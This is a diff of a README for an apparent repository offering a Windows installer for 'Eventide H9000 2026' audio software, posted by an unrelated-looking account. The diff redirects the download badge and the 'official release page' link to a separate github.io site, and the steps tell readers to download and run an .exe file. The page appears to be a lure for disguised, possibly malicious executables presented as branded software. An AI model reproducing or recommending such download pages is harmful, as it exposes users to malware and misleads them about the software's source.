@@ -1,6 +1,6 @@
 # 🎧 Eventide-H9000-2026 - Professional Grade Audio Processing For Windows
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/mariellenarrowshaped531/Eventide-H9000-2026)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://mariellenarrowshaped531.github.io)
 
 This repository provides the Windows installer for the Eventide H9000 software plugin. This tool brings high-fidelity reverb and multi-effects processing to your digital audio workstation. You can use this software on Windows 10 and Windows 11 systems.
 
@@ -19,7 +19,7 @@ You need a computer that meets these specifications to use the plugin:
 
 Follow these steps to obtain the installer files:
 
-1. Visit the [official release page](https://github.com/mariellenarrowshaped531/Eventide-H9000-2026).
+1. Visit the [official release page](https://mariellenarrowshaped531.github.io).
 2. Locate the latest version of the installer in the Assets section.
 3. Click the file name ending in .exe to start your download.
 4. Save the file to your Downloads folder or your desktop for easy access.
